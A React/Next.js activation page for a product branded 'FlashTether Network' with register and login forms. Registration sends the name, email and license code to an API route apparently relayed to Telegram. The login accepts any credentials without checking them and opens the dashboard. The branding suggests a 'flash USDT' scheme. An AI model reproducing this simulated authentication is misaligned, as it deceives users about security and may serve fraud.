"use client";

import { useState, Suspense } from "react";
import { useSearchParams, useRouter } from "next/navigation";
import { Mail, Lock, User, Ticket, Zap, LogIn, UserPlus } from "lucide-react";
import { useT } from "@/lib/i18n";

type Tab = "register" | "login";

function ActivateContent() {
  const params = useSearchParams();
  const router = useRouter();
  const { t } = useT();
  const a = t.activate;

  const prefillEmail = params.get("e") ?? "";
  const prefillCode = params.get("code") ?? "";

  const [tab, setTab] = useState<Tab>("register");

  // Register state
  const [accountCode, setAccountCode] = useState(prefillCode);
  const [fullName, setFullName] = useState("");
  const [regEmail, setRegEmail] = useState(prefillEmail);
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  // Login state
  const [loginEmail, setLoginEmail] = useState(prefillEmail);
  const [loginPassword, setLoginPassword] = useState("");

  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!accountCode.trim()) {
      setError(a.errCodeRequired);
      return;
    }
    if (password !== confirmPassword) {
      setError(a.errPasswordMatch);
      return;
    }
    if (password.length < 6) {
      setError(a.errPasswordShort);
      return;
    }

    setLoading(true);
    try {
      await fetch("/api/notify-register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fullName, email: regEmail, accountCode }),
      });
    } catch {
      // Telegram hatası akışı durdurmasın
    }

    await new Promise((r) => setTimeout(r, 900));
    router.push("/pending?type=register");
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!loginEmail || !loginPassword) {
      setError(a.errFillAll);
      return;
    }
    setLoading(true);
    await new Promise((r) => setTimeout(r, 800));
    localStorage.setItem("cv_user_email", loginEmail);
    localStorage.setItem("cv_user_name", loginEmail.split("@")[0]);
    router.push("/dashboard");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-950 flex items-center justify-center px-4 py-12">
      <div className="pointer-events-none fixed inset-0 overflow-hidden">
        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-[500px] h-[400px] bg-amber-500/10 rounded-full blur-3xl" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 mb-5">
            <span className="text-2xl">⚡</span>
            <span className="text-lg font-black tracking-tight text-white">
              Flash<span className="text-amber-400">Tether</span>{" "}
              <span className="text-xs font-semibold tracking-widest text-gray-400 uppercase">Network</span>
            </span>
            <span className="text-2xl">🌐</span>
          </div>
          <h1 className="text-2xl font-bold text-white mb-1">{a.title}</h1>
          <p className="text-gray-400 text-sm">{a.subtitle}</p>
        </div>

        <div className="flex bg-gray-900/60 border border-gray-800 rounded-xl p-1 mb-6">
          <button
            onClick={() => { setTab("register"); setError(""); }}
            className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold transition-all ${
              tab === "register"
                ? "bg-amber-500 text-white shadow-lg shadow-amber-500/20"
                : "text-gray-400 hover:text-white"
            }`}
          >
            <UserPlus className="w-4 h-4" />
            {a.newUser}
          </button>
          <button
            onClick={() => { setTab("login"); setError(""); }}
            className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-semibold transition-all ${
              tab === "login"
                ? "bg-amber-500 text-white shadow-lg shadow-amber-500/20"
                : "text-gray-400 hover:text-white"
            }`}
          >
            <LogIn className="w-4 h-4" />
            {a.alreadyRegistered}
          </button>
        </div>

        <div className="bg-gray-900/70 backdrop-blur-xl border border-gray-800/80 rounded-2xl p-7 shadow-2xl">
          {error && (
            <div className="bg-red-500/10 border border-red-500/40 rounded-lg px-4 py-3 text-red-400 text-sm mb-5">
              {error}
            </div>
          )}

          {tab === "register" ? (
            <form onSubmit={handleRegister} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                  {a.licenseCodeLabel}
                </label>
                <div className="relative">
                  <Ticket className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-amber-500" />
                  <input
                    type="text"
                    value={accountCode}
                    onChange={(e) => setAccountCode(e.target.value.toUpperCase())}
                    className="w-full pl-10 pr-4 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all uppercase text-sm"
                    placeholder={a.licenseCodePlaceholder}
                    required
                  />
                </div>
                <p className="text-xs text-gray-600 mt-1">{a.licenseCodeHint}</p>
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                  {a.fullName}
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input
                    type="text"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                    placeholder={a.fullNamePlaceholder}
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                  {a.email}
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input
                    type="email"
                    value={regEmail}
                    onChange={(e) => setRegEmail(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                    placeholder={a.emailPlaceholder}
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                    {a.password}
                  </label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full pl-10 pr-3 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                      placeholder={a.passwordMin}
                      required
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                    {a.confirmPassword}
                  </label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                    <input
                      type="password"
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      className="w-full pl-10 pr-3 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                      placeholder={a.confirmRepeat}
                      required
                    />
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 mt-1 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-white font-bold rounded-lg transition-all shadow-lg shadow-amber-500/20 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    {a.creatingAccount}
                  </>
                ) : (
                  <>
                    <UserPlus className="w-4 h-4" />
                    {a.createAccountBtn}
                  </>
                )}
              </button>
            </form>
          ) : (
            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                  {a.email}
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input
                    type="email"
                    value={loginEmail}
                    onChange={(e) => setLoginEmail(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                    placeholder={a.emailPlaceholder}
                    required
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">
                  {a.password}
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                  <input
                    type="password"
                    value={loginPassword}
                    onChange={(e) => setLoginPassword(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-gray-800/60 border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:border-amber-500 focus:ring-1 focus:ring-amber-500/30 transition-all text-sm"
                    placeholder={a.passwordEnter}
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 mt-1 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-white font-bold rounded-lg transition-all shadow-lg shadow-amber-500/20 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    {a.signingIn}
                  </>
                ) : (
                  <>
                    <LogIn className="w-4 h-4" />
                    {a.signInBtn}
                  </>
                )}
              </button>
            </form>
          )}
        </div>

        <div className="mt-5 text-center flex items-center justify-center gap-2 text-gray-700 text-xs">
          <Zap className="w-3 h-3 text-amber-700" />
          <span>{a.securityNote}</span>
        </div>
      </div>
    </div>
  );
}

export default function ActivatePage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-gray-950" />}>
      <ActivateContent />
    </Suspense>
  );
}
